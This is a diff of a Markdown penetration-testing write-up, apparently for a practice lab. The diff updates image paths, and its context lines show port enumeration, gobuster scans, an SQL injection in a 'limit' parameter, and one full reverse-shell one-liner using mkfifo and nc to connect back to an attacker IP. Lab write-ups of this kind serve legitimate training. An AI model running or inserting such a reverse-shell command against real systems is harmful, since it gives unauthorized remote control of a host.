@@ -24,11 +24,11 @@ FTP doesn't allow for anonymous connections.
 
 Port 80 shows a login page:
 
-<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>
 
 Default creds don't work, so I ran a `gobuster` scan while moving on. Port 3305 shows a default Apache page:
 
-<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (18) (2).png" alt=""><figcaption></figcaption></figure>
 
 Ran a `gobuster` scan on this too while enumerating port 8080, which had Tomcat.
 
@@ -111,4 +111,4 @@ This found the `limit` variable to be vulnerable to SQL Injection and I got a we
 os-shell> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.196 3305 >/tmp/f
 ```
 
-<figure><img src="../../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (32) (3).png" alt=""><figcaption></figcaption></figure>
